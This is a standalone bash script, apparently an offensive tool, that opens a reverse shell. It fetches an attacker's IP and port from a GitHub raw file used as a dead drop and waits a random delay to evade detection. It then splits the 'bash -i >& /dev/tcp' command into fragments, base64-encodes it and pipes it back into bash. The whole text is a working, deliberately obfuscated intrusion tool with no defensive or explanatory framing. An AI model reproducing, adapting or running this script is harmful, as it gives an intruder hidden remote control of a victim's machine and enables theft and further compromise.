#!/bin/bash

# URL pointing to GitHub file with format: IP:PORT
GITHUB_URL="https://raw.githubusercontent.com/username/repo-name/main/connection.txt"

# Fetch IP and PORT
DATA=$(curl -s "$GITHUB_URL")
IP="${DATA%%:*}"
PORT="${DATA##*:}"

# Random delay between 45 and 240 seconds
DELAY=$((RANDOM % 195 + 45))
sleep "$DELAY"

# Obfuscated command construction
CMD1="bash"
CMD2="-i"
TARGET="/dev/tcp/$IP/$PORT"
REDIR1="0>&1"
REDIR2=">&"

# Construct full command
FULL_CMD="$CMD1 $CMD2 $REDIR2 $TARGET $REDIR1"

# Base64 encode the final command
ENCODED=$(echo "$FULL_CMD" | base64)

# Decode and execute the reverse shell
echo "$ENCODED" | base64 -d | bash
